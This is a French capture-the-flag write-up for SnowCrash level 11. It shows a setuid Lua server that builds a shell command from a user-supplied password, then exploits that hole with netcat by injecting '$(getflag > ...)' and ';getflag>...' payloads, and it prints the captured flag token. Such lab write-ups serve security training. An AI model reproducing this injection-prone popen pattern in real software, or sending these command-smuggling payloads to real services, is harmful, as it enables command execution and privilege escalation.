
# **Level 11**

Pour le level11, nous avons un fichier en `.lua` qui semble faire tourner un server en `localhost:5151`

```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

On remarque rapidement que le echo semble interpreter la chaine de caractere passer en parametre donc on se connecte au server

```
level11@SnowCrash:~$ nc localhost 5151
Password:
```

Et on rentre en mot de passe un subshell qui execute `getflag`

```
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag > /var/crash/flag)
Erf nope..
level11@SnowCrash:~$ cat /var/crash/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

OU

```
level11@SnowCrash:~$ nc localhost 5151
Password: ;getflag>/var/crash/test
Erf nope..
level11@SnowCrash:~$ cat /var/crash/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

> ### NEXT : [Level 12](/level12/resources/README.md)
